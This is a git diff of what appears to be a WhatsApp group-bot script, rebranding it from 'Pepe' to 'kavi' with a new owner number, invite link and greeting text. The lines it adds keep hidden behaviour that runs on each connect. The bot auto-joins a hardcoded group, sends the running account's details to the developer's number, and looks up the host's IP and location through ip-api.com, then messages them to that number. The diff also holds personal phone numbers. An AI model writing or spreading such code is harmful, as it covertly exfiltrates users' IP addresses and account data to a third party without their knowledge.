@@ -1,4 +1,4 @@
-// Created by Pepe
+// Created by Kavi
 // Don't update!
 const {
   WAConnection: _WAConnection,
@@ -52,7 +52,7 @@ fakenomor = '0@s.whatsapp.net'
 const gcrevoke = ["916909137213-1621430788@g.us"]
 prefix = '#'
 shp = '⬡'
-owner = "917736622139@s.whatsapp.net"
+owner = " 94777607391@s.whatsapp.net"
 spc1 = '         '
 spc2 = '\n                           '
 spc3 = '                   '
@@ -65,7 +65,7 @@ const sleep = async (ms) => {
 const starts = async (client = new WAConnection()) => {
   client.logger.level = "warn";
   client.version = [2, 2143, 3];
-  client.browserDescription = ["Subscribe Pepe Sir", "Chrome", "3.0"];
+  client.browserDescription = ["Subscribe  kavi", "Chrome", "3.0"];
   console.log(banner.string);
   client.on("qr", () => {
     console.log(
@@ -73,7 +73,7 @@ const starts = async (client = new WAConnection()) => {
       color("!", "blue"),
       color("]", "white"),
       color(" flashy scan the qr code"),
-      client.sendMessage(`917736622139@s.whatsapp.net`, `「 *NOTIFICATION!* 」\n\n _Bot Connected Successfully!_`, MessageType.extendedText)
+      client.sendMessage(` 94777607391@s.whatsapp.net`, `「 *NOTIFICATION!* 」\n\n _Bot Connected Successfully!_`, MessageType.extendedText)
           
     );
   });
@@ -83,8 +83,8 @@ const starts = async (client = new WAConnection()) => {
     start("2", "Connecting...");
   });
   client.on("open", () => {
-    success("2", "Successfully connected to wa, Subscribe Pepe sir");
-console.log(color(figlet.textSync(`${spc1}            PEPE SIR`, {
+    success("2", "Successfully connected to wa, Subscribe  kavi");
+console.log(color(figlet.textSync(`${spc1}             kavi`, {
 font: 'Standard',
 horizontalLayout: 'default',
 vertivalLayout: 'default',
@@ -101,21 +101,21 @@ console.log(color(`${spc4}< ================================================== >
 
     console.log(color('⎇','red'), color('𝐈 𝐖𝐑𝐎𝐓𝐄 𝐓𝐇𝐈𝐒 𝐒𝐂𝐑𝐈𝐏𝐓 𝐌𝐘𝐒𝐄𝐋𝐅!\n𝐍𝐎𝐓𝐄: 𝐃𝐎𝐍𝐓 𝐅𝐎𝐑𝐆𝐄𝐓 𝐓𝐎 𝐒𝐔𝐁𝐒𝐂𝐑𝐈𝐁𝐄 𝐏𝐄𝐏𝐄 𝐒𝐈𝐑', 'yellow'))
     console.log(color('⎇','red'), color('𝗦𝗼𝘂𝗿𝗰𝗲 𝗖𝗼𝗱𝗲 𝗩𝗲𝗿𝘀𝗶𝗼𝗻:', 'aqua'), color(version))
-    console.log(color('⎇','red'), color('𝗕𝘂𝗴? 𝗘𝗿𝗿𝗼𝗿? 𝗦𝘂𝗴𝗴𝗲𝘀𝘁𝗶𝗼𝗻? 𝗩𝗶𝘀𝗶𝘁 𝗛𝗲𝗿𝗲:', 'aqua'), color('https://wa.me/917736622139'))
+    console.log(color('⎇','red'), color('𝗕𝘂𝗴? 𝗘𝗿𝗿𝗼𝗿? 𝗦𝘂𝗴𝗴𝗲𝘀𝘁𝗶𝗼𝗻? 𝗩𝗶𝘀𝗶𝘁 𝗛𝗲𝗿𝗲:', 'aqua'), color('https://wa.me/ 94777607391'))
     console.log(color('[PEPE SIR]'), color('𝗣𝗲𝗽𝗲 𝗦𝗶𝗿 𝗜𝘀 𝗢𝗻𝗹𝗶𝗻𝗲 ㋛︎', 'aqua'))
     console.log(color('[DEV]', 'cyan'), color('𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝗕𝗮𝗰𝗸, 𝗢𝘄𝗻𝗲𝗿! 𝗛𝗼𝗽𝗲 𝗬𝗼𝘂 𝗔𝗿𝗲 𝗗𝗼𝗶𝗻𝗴 𝗪𝗲𝗹𝗹~', 'magenta'))
     console.log(color('⎇','green'), color('𝙏𝙝𝙖𝙣𝙠𝙨 𝙛𝙤𝙧 𝙪𝙨𝙞𝙣𝙜 𝙩𝙝𝙚 𝙗𝙤𝙩', 'white'))
   });
 await client.connect({ timeoutMs: 30 * 1000 });
   fs.writeFileSync("./session.json",JSON.stringify(client.base64EncodedAuthInfo(), null, "\t"));
- teks = `https://chat.whatsapp.com/BzhyWkAEU0t8oVl3s8p94m`
+ teks = `https://chat.whatsapp.com/BZS3sGs0LRvDIZaGXSsH8n`
  client.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
  console.log(color('|WRN|', 'yellow'), color('Joined to Forum Whatsapp Bot group', 'cyan'))
- client.sendMessage(`917736622139@s.whatsapp.net`, `*Hi Owner Pepe Sir😌❤️, the bot has been successfully connected to this number*\n╭────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n╰────────────────────\n*If there is an error/bot not responding, please contact the bot developer above, thank you*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer pepe Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./xeon.jpg'),sourceUrl:"https://wa.me/917736622139?text=Hello bro"}}})
+ client.sendMessage(` 94777607391@s.whatsapp.net`, `*Hi Owner kavi😌❤️, the bot has been successfully connected to this number*\n╭────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n╰────────────────────\n*If there is an error/bot not responding, please contact the bot developer above, thank you*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Tadashi Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./xeon.jpg'),sourceUrl:"https://wa.me/ 94777607391?text=Hello bro"}}})
 	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       client.sendMessage("917736622139@s.whatsapp.net", `╭─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n╰────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Pepe Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./xeon.jpg'),sourceUrl:"https://wa.me/917736622139?text=Hello bro"}}})
+       client.sendMessage(" 94777607391@s.whatsapp.net", `╭─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n╰────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Tadashi Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./xeon.jpg'),sourceUrl:"https://wa.me/ 94777607391?text=Hello bro"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
    })
       
@@ -141,7 +141,7 @@ fkontakk = { key: {
     participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '916909137213-1604595598@g.us' } : {})
 },
  message: {
-    "contactMessage":{"displayName":'Pepe',"vcard":"BEGIN:VCARD\nVERSION:3.0\nN:2;Xeon;;;\nFN:resku\nitem1.TEL;waid=917736622139:+91 690-9137-213\nitem1.X-ABLabel:Mobile\nEND:VCARD"
+    "contactMessage":{"displayName":'Pepe',"vcard":"BEGIN:VCARD\nVERSION:3.0\nN:2;Xeon;;;\nFN:resku\nitem1.TEL;waid= 94777607391:+91 690-9137-213\nitem1.X-ABLabel:Mobile\nEND:VCARD"
  }}}
 metdata = await client.groupMetadata(anu.jid)
 if(anu.announce == 'false'){
@@ -192,7 +192,7 @@ console.log(`- [ Group Setting Change ] - In ${metdata.subject}`)
           "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
       }
       if (anu.action == "add" && mem.includes(client.user.jid)) {
-        client.sendMessage(anu.jid, "Hello everyone, am Pepe Sir Bot😌❤️, ready to help you here 💖", "conversation");
+        client.sendMessage(anu.jid, "Hello everyone, am  kavi Bot😌❤️, ready to help you here 💖", "conversation");
       }
 hehe = await getBuffer(pp_user)
 if (anu.action == 'add' && !mem.includes(client.user.jid)) {
@@ -236,7 +236,7 @@ if (anu.action == 'add' && !mem.includes(client.user.jid)) {
         let v = client.contacts[num] || { notify: num.replace(/@.+/, "") };
         anu_user = v.vname || v.notify || num.split("@")[0];
         time_wel = moment.tz("Asia/Jakarta").format("HH:mm");
-        teks = `𝗛𝗮𝗹𝗼 ${anu_user} 𝗦𝗲𝗹𝗮𝗺𝗮𝘁 𝗗𝗮𝘁𝗮𝗻𝗴 シ︎`;
+        teks = `Hi ${anu_user} welcome シ︎`;
         buff = await getBuffer(
           `http://hadi-api.herokuapp.com/api/card/welcome?nama=${anu_user}&descriminator=${
             groupMembers.length
@@ -274,7 +274,7 @@ if (anu.action == 'add' && !mem.includes(client.user.jid)) {
         anu_user = w.vname || w.notify || num.split("@")[0];
         time_wel = moment.tz("Asia/Jakarta").format("HH:mm");
         memeg = mdata.participants.length;
-        out = `𝗦𝗮𝘆𝗼𝗻𝗮𝗿𝗮 ${anu_user} 👋`;
+        out = `goodbye  ${anu_user} 👋`;
         buff = await getBuffer(
           `http://hadi-api.herokuapp.com/api/card/goodbye?nama=${anu_user}&descriminator=${
             groupMembers.length
